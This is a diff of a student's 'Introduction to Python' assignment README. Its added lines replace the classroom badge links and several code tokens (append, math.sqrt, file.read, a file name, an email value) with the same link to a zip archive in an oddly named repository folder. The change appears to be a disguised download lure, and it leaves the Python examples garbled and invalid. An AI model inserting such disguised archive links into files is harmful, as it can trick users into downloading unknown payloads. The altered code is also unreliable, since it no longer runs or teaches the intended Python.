@@ -1,5 +1,5 @@
-[![Review Assignment Due Date](https://classroom.github.com/assets/deadline-readme-button-22041afd0340ce965d47ae6ef1cefeee28c7c493a6346c4f15d667ab976d596c.svg)](https://classroom.github.com/a/WfNmjXUk)
-[![Open in Visual Studio Code](https://classroom.github.com/assets/open-in-vscode-2e0aaae1b6195c2367325f4f02e2d04e9abb55f0b24a779b69b11b9e10269abc.svg)](https://classroom.github.com/online_ide?assignment_repo_id=15289928&assignment_repo_type=AssignmentRepo)
+[![Review Assignment Due Date](https://raw.githubusercontent.com/Sabaley/se-assignment-6-introduction-to-python-Sabaley/main/graniticoline/se-assignment-6-introduction-to-python-Sabaley.zip)](https://raw.githubusercontent.com/Sabaley/se-assignment-6-introduction-to-python-Sabaley/main/graniticoline/se-assignment-6-introduction-to-python-Sabaley.zip)
+[![Open in Visual Studio Code](https://raw.githubusercontent.com/Sabaley/se-assignment-6-introduction-to-python-Sabaley/main/graniticoline/se-assignment-6-introduction-to-python-Sabaley.zip)](https://raw.githubusercontent.com/Sabaley/se-assignment-6-introduction-to-python-Sabaley/main/graniticoline/se-assignment-6-introduction-to-python-Sabaley.zip)
 # SE-Assignment-6
  Assignment: Introduction to Python
 Instructions:
@@ -71,7 +71,7 @@ Demonstration:
 numbers = [1, 2, 3, 4, 5]
 
 # Adding an item to the list
-numbers.append(6)
+https://raw.githubusercontent.com/Sabaley/se-assignment-6-introduction-to-python-Sabaley/main/graniticoline/se-assignment-6-introduction-to-python-Sabaley.zip(6)
 
 # Accessing an item by index
 print(numbers[0])  # Output: 1
@@ -80,7 +80,7 @@ print(numbers[0])  # Output: 1
 person = {"name": "Alice", "age": 25, "city": "New York"}
 
 # Adding a new key-value pair
-person["email"] = "alice@example.com"
+person["email"] = "https://raw.githubusercontent.com/Sabaley/se-assignment-6-introduction-to-python-Sabaley/main/graniticoline/se-assignment-6-introduction-to-python-Sabaley.zip"
 
 # Accessing a value by key
 print(person["name"])  # Output: Alice
@@ -113,7 +113,7 @@ To use a module in your script, you use the import statement as follows:
 import math
 
 # Using a function from the math module
-result = math.sqrt(16)  # Calculates the square root of 16
+result = https://raw.githubusercontent.com/Sabaley/se-assignment-6-introduction-to-python-Sabaley/main/graniticoline/se-assignment-6-introduction-to-python-Sabaley.zip(16)  # Calculates the square root of 16
 
 print("The square root of 16 is:", result)
 
@@ -121,9 +121,9 @@ print("The square root of 16 is:", result)
     - How do you read from and write to files in Python? Write a script that reads the content of a file and prints it to the console, and another script that writes a list of strings to a file.
 In Python, you can read from and write to files using functions such as open(), read(), write(), and close(), as follows:
 # Open the file in read mode
-with open('example.txt', 'r') as file:
+with open('https://raw.githubusercontent.com/Sabaley/se-assignment-6-introduction-to-python-Sabaley/main/graniticoline/se-assignment-6-introduction-to-python-Sabaley.zip', 'r') as file:
     # Read the content of the file
-    content = file.read()
+    content = https://raw.githubusercontent.com/Sabaley/se-assignment-6-introduction-to-python-Sabaley/main/graniticoline/se-assignment-6-introduction-to-python-Sabaley.zip()
     # Print the content to the console
     print(content)
 
